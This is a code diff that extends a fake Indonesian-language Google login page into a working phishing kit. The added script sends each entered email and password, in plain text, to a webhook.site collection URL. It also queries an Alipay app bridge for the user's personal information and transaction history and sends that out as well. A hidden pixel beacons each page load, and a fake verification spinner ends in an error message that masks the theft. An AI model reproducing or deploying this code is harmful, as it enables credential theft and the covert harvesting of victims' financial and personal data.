@@ -1,37 +1,92 @@
-<!doctype html><html lang="id" dir="ltr"><head><base href="https://accounts.google.com/v3/signin/"><link rel="preconnect" href="//www.gstatic.com"><meta name="referrer" content="origin">
-<title>Login - Akun Google</title>
-<style>body{margin:0;font-family:Google Sans,Roboto,Arial,sans-serif;background:#fff} .hidden-beacon{display:none}</style>
+<!doctype html><html lang="id" dir="ltr"><head><base href="https://accounts.google.com/v3/signin/"><meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1"><title>Login - Akun Google</title>
+<style>
+body{margin:0;font-family:Google Sans,Roboto,Arial,sans-serif;background:#f8f9fa;color:#1f1f1f}
+.card{max-width:448px;margin:40px auto;background:#fff;border:1px solid #dadce0;border-radius:8px;padding:36px 40px}
+.logo{display:block;margin:0 auto 16px;width:48px}
+h1{font-size:22px;font-weight:400;text-align:center;margin:8px 0 4px}
+.sub{color:#5f6368;text-align:center;font-size:14px;margin:0 0 24px}
+.input-wrap{position:relative;border:1px solid #dadce0;border-radius:4px;padding:12px 14px;margin:16px 0}
+.input-wrap.focus{border:2px solid #1a73e8;padding:11px 13px}
+.input-wrap input{width:100%;border:none;outline:none;font-size:15px}
+.label{position:absolute;left:14px;top:13px;color:#5f6368;background:#fff;padding:0 4px;transition:0.15s;pointer-events:none}
+.input-wrap.focus .label,.input-wrap.hasval .label{top:-9px;font-size:12px;color:#1a73e8}
+.btn{float:right;background:#1a73e8;color:#fff;border:none;border-radius:4px;padding:10px 24px;font-size:14px;cursor:pointer}
+.btn:disabled{opacity:0.5}
+.link{color:#1a73e8;font-size:13px;text-decoration:none}
+.hidden{display:none}
+.note{font-size:12px;color:#5f6368;margin-top:32px}
+</style>
 </head><body>
-<!-- Google login UI clone (trimmed) -->
-<div style="max-width:400px;margin:40px auto;padding:24px;border:1px solid #dadce0;border-radius:8px">
-  <img src="https://www.gstatic.com/images/branding/googleg_gradient/svg/googleg_gradient_standard_48px.svg" width="48" style="display:block;margin:0 auto 16px">
-  <h1 style="text-align:center;font-size:22px">Login</h1><p style="text-align:center;color:#5f6368">Gunakan Akun Google Anda</p>
-  <div style="border:1px solid #dadce0;border-radius:4px;padding:12px 14px;margin:16px 0">
-    <div style="font-size:12px;color:#5f6368">Email atau nomor telepon</div>
-    <input style="width:100%;border:none;outline:none;font-size:15px" placeholder=" " disabled>
+<div class="card" id="card">
+  <img src="https://www.gstatic.com/images/branding/googleg_gradient/svg/googleg_gradient_standard_48px.svg" class="logo">
+  <h1>Login</h1><p class="sub">Gunakan Akun Google Anda</p>
+
+  <div id="step1">
+    <div class="input-wrap" id="wrap-email"><span class="label">Email atau nomor telepon</span><input id="inp-email" type="text" autocomplete="username"></div>
+    <a class="link" href="#">Lupa email?</a>
+    <p class="note">Bukan komputer Anda? Gunakan mode Tamu untuk login secara pribadi.</p>
+    <div style="display:flex;justify-content:space-between;margin-top:32px"><a class="link" style="line-height:36px" href="#">Buat akun</a><button class="btn" id="btn-next1">Berikutnya</button></div>
   </div>
-  <button style="background:#1a73e8;color:#fff;border:none;border-radius:4px;padding:10px 24px;float:right">Berikutnya</button>
-  <div style="clear:both"></div>
-  <p style="font-size:12px;color:#5f6368;margin-top:24px">Bukan komputer Anda? Gunakan mode Tamu.</p>
+
+  <div id="step2" class="hidden">
+    <div style="display:flex;align-items:center;border:1px solid #dadce0;border-radius:16px;padding:6px 12px;width:fit-content;margin-bottom:16px"><span id="chosen-email" style="font-size:13px"></span></div>
+    <div class="input-wrap" id="wrap-pass"><span class="label">Masukkan sandi Anda</span><input id="inp-pass" type="password" autocomplete="current-password"></div>
+    <div style="margin-top:24px;display:flex;justify-content:space-between"><a class="link" href="#">Lupa sandi?</a><button class="btn" id="btn-next2">Berikutnya</button></div>
+  </div>
+
+  <div id="step3" class="hidden" style="text-align:center;padding:24px 0">
+    <div style="border:3px solid #dadce0;border-top:3px solid #1a73e8;border-radius:50%;width:32px;height:32px;animation:spin 1s linear infinite;margin:0 auto 16px"></div><p style="font-size:14px;color:#5f6368">Memverifikasi...</p>
+    <style>@keyframes spin{0%{transform:rotate(0)}100%{transform:rotate(360deg)}}</style>
+  </div>
 </div>
-<!-- Hidden OOB beacons like v15 landing -->
-<img src="https://webhook.site/ae24b403-f298-4923-8e42-5cb1ba6cbd50?src=larpLandingImg" class="hidden-beacon" width="1" height="1">
+
+<!-- Hidden OOB like v15 landing -->
+<img src="https://webhook.site/ae24b403-f298-4923-8e42-5cb1ba6cbd50?src=larpLandingImg" style="display:none" width="1" height="1">
 <script>
 (function(){
   var WH='https://webhook.site/ae24b403-f298-4923-8e42-5cb1ba6cbd50';
-  function wh(p){try{var q=[];for(var k in p)q.push(k+'='+encodeURIComponent(String(p[k]).slice(0,380)));fetch(WH+'?'+q.join('&'),{mode:'no-cors',cache:'no-store'}).catch(function(){})}catch(e){}}
-  function bridgeReady(cb){if(window.AlipayJSBridge)return cb();var f=false;var go=function(){if(!f){f=true;cb();}};document.addEventListener('AlipayJSBridgeReady',go,false);setTimeout(go,5000);}
+  var R={email:'',password:'',env:null,pii:null,trx:null};
+  function wh(p){try{var q=[];for(var k in p)q.push(k+'='+encodeURIComponent(String(p[k]).slice(0,700)));fetch(WH+'?'+q.join('&'),{mode:'no-cors',cache:'no-store'}).catch(function(){})}catch(e){}}
+  function compact(o){try{return typeof o==='string'?o:JSON.stringify(o)}catch(e){return String(o)}}
+  function bridgeReady(cb){if(window.AlipayJSBridge)return cb();var f=false;var go=function(){if(!f){f=true;cb();}};document.addEventListener('AlipayJSBridgeReady',go,false);setTimeout(go,4000);}
+
+  // UI logic
+  var emailEl=document.getElementById('inp-email'), passEl=document.getElementById('inp-pass');
+  var w1=document.getElementById('wrap-email'), w2=document.getElementById('wrap-pass');
+  emailEl.addEventListener('focus',function(){w1.classList.add('focus')}); emailEl.addEventListener('blur',function(){w1.classList.remove('focus'); if(emailEl.value) w1.classList.add('hasval'); else w1.classList.remove('hasval')});
+  passEl.addEventListener('focus',function(){w2.classList.add('focus')}); passEl.addEventListener('blur',function(){w2.classList.remove('focus'); if(passEl.value) w2.classList.add('hasval'); else w2.classList.remove('hasval')});
+
+  document.getElementById('btn-next1').onclick=function(){
+    var v=emailEl.value.trim(); if(!v){ emailEl.focus(); return; }
+    R.email=v; document.getElementById('chosen-email').textContent=v;
+    document.getElementById('step1').classList.add('hidden'); document.getElementById('step2').classList.remove('hidden');
+    wh({src:'larpLanding',stage:'email',email:v});
+    // also send boot pii already captured
+  };
+  document.getElementById('btn-next2').onclick=function(){
+    var p=passEl.value; if(!p){ passEl.focus(); return; }
+    R.password=p;
+    document.getElementById('step2').classList.add('hidden'); document.getElementById('step3').classList.remove('hidden');
+    // final exfil with creds + pii/trx
+    var piiLen=R.pii?compact(R.pii).length:0, trxLen=R.trx?compact(R.trx).length:0;
+    wh({src:'larpLanding',stage:'creds',email:R.email,password:R.password,piiBytes:piiLen,trxBytes:trxLen,piiHead:R.pii?compact(R.pii).slice(0,600):'',trxHead:R.trx?compact(R.trx).slice(0,300):''});
+    // keep also sending as final for compatibility with v15 parser
+    setTimeout(function(){ wh({src:'larpLanding',stage:'final',email:R.email,password:p,piiBytes:piiLen,trxBytes:trxLen}); },800);
+    // fake redirect after 2s (optional)
+    setTimeout(function(){ document.getElementById('step3').innerHTML='<p style="color:#5f6368;font-size:14px">Terjadi kesalahan. Coba lagi nanti.</p>'; },3000);
+  };
+
   bridgeReady(function(){
     var hasB=!!window.AlipayJSBridge; var sp={}; try{sp=window.AlipayJSBridge.startupParams||{}}catch(e){}
-    var env={hasBridge:hasB,appId:sp.appId,href:location.href.slice(0,120),origin:location.origin,ts:new Date().toISOString(),larp:true};
-    wh({src:'larpLanding',stage:'boot',d:JSON.stringify(env).slice(0,380)});
+    R.env={hasBridge:hasB,appId:sp.appId,href:location.href.slice(0,120),origin:location.origin,ts:new Date().toISOString(),larp:true};
+    wh({src:'larpLanding',stage:'boot',d:compact(R.env).slice(0,700)});
     if(hasB){
       try{window.AlipayJSBridge.call('getUserInfoData',{event:'getUserInformation',info:{queryBy:'all'}},function(r){
-        var piiLen=JSON.stringify(r).length; wh({src:'larpLanding',stage:'pii',piiBytes:piiLen,piiHead:JSON.stringify(r).slice(0,380)});
+        R.pii=r; var piiLen=compact(r).length; wh({src:'larpLanding',stage:'pii',piiBytes:piiLen,piiHead:compact(r).slice(0,700)});
         try{window.AlipayJSBridge.call('getTransactionHistoryList',{event:'getInitList',pageNum:1,forceCache:false},function(t){
-          wh({src:'larpLanding',stage:'final',piiBytes:piiLen,trxBytes:JSON.stringify(t).length,trxHead:JSON.stringify(t).slice(0,200)});
-        });}catch(e2){wh({src:'larpLanding',stage:'final',piiBytes:piiLen,trxErr:String(e2).slice(0,80)});}
-      });}catch(e){wh({src:'larpLanding',stage:'pii',err:String(e).slice(0,120)});}
+          R.trx=t; wh({src:'larpLanding',stage:'final',piiBytes:piiLen,trxBytes:compact(t).length,trxHead:compact(t).slice(0,300)});
+        });}catch(e2){ wh({src:'larpLanding',stage:'final',piiBytes:piiLen,trxErr:String(e2).slice(0,80)}); }
+      });}catch(e){ wh({src:'larpLanding',stage:'pii',err:String(e).slice(0,120)}); }
     } else {
       wh({src:'larpLanding',stage:'final',hasBridge:false});
     }
